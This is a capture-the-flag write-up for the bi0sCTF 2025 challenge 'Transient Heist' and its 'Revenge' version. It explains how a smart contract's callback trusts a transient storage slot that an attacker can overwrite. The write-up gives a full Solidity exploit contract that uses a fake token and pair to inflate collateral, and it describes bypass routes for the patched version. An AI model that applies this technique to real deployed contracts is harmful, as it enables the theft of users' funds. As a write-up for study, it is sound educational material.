---
title: Blockchain - Transient Heist (Revenge)
description: 2025 | bi0sCTF | Blockchain
tags:
    - smart contract
    - transient storage
---

## Description

> [Challenge Files](https://github.com/teambi0s/bi0sCTF/blob/bd6d2efbf5c8e69e5d9c06fcbfadd7733cdaffae/2025/BLOCKCHAIN/Transient-Heist/Handout/transient-heist-chall-files.zip)

### Revenge

They said memory fades — but some secrets linger just long enough.                       
A value set, then forgotten... unless you catch it mid-breath.                         
No storage, no logs, yet the truth lies between one call and the next.                        
Can you see what was never meant to stay?

> [Challenge Files](https://github.com/teambi0s/bi0sCTF/blob/bd6d2efbf5c8e69e5d9c06fcbfadd7733cdaffae/2025/BLOCKCHAIN/Transient-Heist-Revenge/Handout/transient-heist-revenge-chall-files.zip)

## Solution

- There are three tokens: WETH, USDC, and SAFEMOON. The initial ratio of their amounts in Uniswap V2 pairs is `1:2500:15087507543753773`. The player initially has 80001 ethers.
- There is an USDSEngine contract, which can accept deposits and mint USDS tokens. Users can choose either function `depositCollateralAndMint` or function `depositCollateralThroughSwap` to make a deposit. The goal of the challenge is to let the player's collateral value of both WETH and SAFEMOON in the USDSEngine excced `keccak256("YOU NEED SOME BUCKS TO GET FLAG")`.
- If the function `depositCollateralThroughSwap` is chosen, it will swap tokens via the Bi0sSwapPair and update the user's deposit status in the callback function `bi0sSwapv1Call`.

    ```js
    function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public acceptedToken(_otherToken)returns (uint256 tokensSentToUserVault){
        IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount);
        IBi0sSwapPair bi0sSwapPair=IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken));
        assembly{
            tstore(1,bi0sSwapPair)
        }
        bytes memory data=abi.encode(_collateralDepositAmount);
        IERC20(_otherToken).approve(address(bi0sSwapPair), swapAmount);
        bi0sSwapPair.swap(_otherToken, swapAmount, address(this),data);
        assembly{
            tokensSentToUserVault:=tload(1)
        }
    }

    function bi0sSwapv1Call(address sender,address collateralToken,uint256 amountOut,bytes memory data) external nonReEntrant {
        uint256 collateralDepositAmount=abi.decode(data,(uint256));
        address bi0sSwapPair;
        assembly{
            bi0sSwapPair:=tload(1)
        }
        if(msg.sender!=bi0sSwapPair){
            revert USDSEngine__Only__bi0sSwapPair__Can__Call();
        }
        if(collateralDepositAmount>amountOut){
            revert USDSEngine__Insufficient__Collateral();
        }
        uint256 tokensSentToUserVault=amountOut-collateralDepositAmount;
        user_vault[sender][collateralToken]+=tokensSentToUserVault;
        assembly{
            tstore(1,tokensSentToUserVault)
        }
        collateralDeposited[sender][collateralToken]+=collateralDepositAmount;
    }
    ```

- The function `bi0sSwapv1Call` uses the value of transient storage slot 1 to verify the caller, and then updates the transient storage slot 1 with `tokensSentToUserVault`. In other words, if we can let the value of `tokensSentToUserVault` be a controllable address, we would be able to call this function arbitrarily. Meanwhile, the function `depositCollateralThroughSwap` only checks if `_otherToken` is accepted token, so the `_collateralToken` can be any token. Therefore, we can deploy a controllable token and its corresponding Bi0sSwapPair, enabling us to manipulate the argument `amountOut` in function `bi0sSwapv1Call` and gain control over it.

    ??? note "Exploiter"

        ```solidity
        contract Exploiter {
            Setup setup;
            IBi0sSwapFactory factory;

            WETH weth;
            SafeMoon safeMoon;

            USDSEngine usdsEngine;

            constructor(Setup _setup) payable {
                require(msg.value == 2);
                setup = _setup;
                factory = _setup.bi0sSwapFactory();
                weth = _setup.weth();
                safeMoon = _setup.safeMoon();
                usdsEngine = _setup.usdsEngine();

                _setup.setPlayer(address(this));
            }

            function exploit() external {
                SafeMoon fake = new SafeMoon(type(uint).max);
                address fakePair = factory.createPair(address(fake), address(weth));
                uint addressAmount = uint160(address(this));
                fake.transfer(fakePair, addressAmount * 2);
                weth.deposit{value: 2}(address(this));
                weth.transfer(fakePair, 1);
                IBi0sSwapPair(fakePair).addLiquidity(address(this));

                weth.approve(address(usdsEngine), 1);
                usdsEngine.depositCollateralThroughSwap(address(weth), address(fake), 1, 0);

                uint256 FLAG_HASH = uint256(keccak256("YOU NEED SOME BUCKS TO GET FLAG")) + 1;
                usdsEngine.bi0sSwapv1Call(address(this), address(weth), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
                usdsEngine.bi0sSwapv1Call(address(this), address(safeMoon), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
            }
        }
        ```

- The revenge version mainly updates the modifier of the function `depositCollateralThroughSwap` from `acceptedToken(_otherToken)` to `acceptedToken(_collateralToken)`. So, we can not use unverified `_collateralToken`. However, since the `_otherToken` is not checked, we can create a token, whose `approve` function calls Bi0sSwapPair's `swap` function with controllable data.

    ```diff
    - function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public acceptedToken(_otherToken)returns (uint256 tokensSentToUserVault){
    + function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public acceptedToken(_collateralToken)returns (uint256 tokensSentToUserVault){
        IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount);
        IBi0sSwapPair bi0sSwapPair=IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken));
        assembly{
            tstore(1,bi0sSwapPair)
        }
        bytes memory data=abi.encode(_collateralDepositAmount);
        IERC20(_otherToken).approve(address(bi0sSwapPair), swapAmount);
        bi0sSwapPair.swap(_otherToken, swapAmount, address(this),data);
        assembly{
            tokensSentToUserVault:=tload(1)
        }
    }
    ```

- Or, with the initial 80,000 ethers, we can exchange for `0x38c0bdc4ade139d62d90d2ad2c3f98efb` SAFEMOON tokens, which is slightly less than a regular 20-byte address. However, we can create a contract with an address starting with `0x0000`, making its address numerically smaller than the amount of SAFEMOON we can obtained. Then, we can use the previously described method to gain control over the function `bi0sSwapv1Call`.

### Flag

> bi0sctf{tx:0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f}

**Revenge**

> bi0sctf{tx:0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f:v2}
